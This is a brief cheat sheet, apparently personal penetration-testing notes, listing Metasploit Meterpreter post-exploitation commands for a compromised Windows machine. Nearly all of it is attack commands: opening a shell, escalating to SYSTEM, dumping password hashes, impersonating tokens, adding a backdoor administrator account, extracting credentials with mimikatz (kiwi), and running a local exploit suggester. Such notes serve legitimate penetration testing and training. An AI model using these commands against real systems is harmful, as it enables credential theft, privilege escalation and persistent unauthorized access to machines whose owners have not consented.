# windows meterpreter

```bash
# gives shell on box
shell

# powershell
load powershell
powershell_shell

# windows specific
getuid
getsystem
getprivs
migrate <system-process>
hashdump

# incognito
# https://github.com/milkdevil/incognito2
load incognito
list_tokens -g
impersonate_token "<token>"
# for better results
migrate <pid>
add_user <user> <pass>
add_localgroup Administrators <user>

# mimikatz
load kiwi
creds_all

# local exploit suggester
use post/multi/recon/local_exploit_suggester
set SESSION <>; run
```
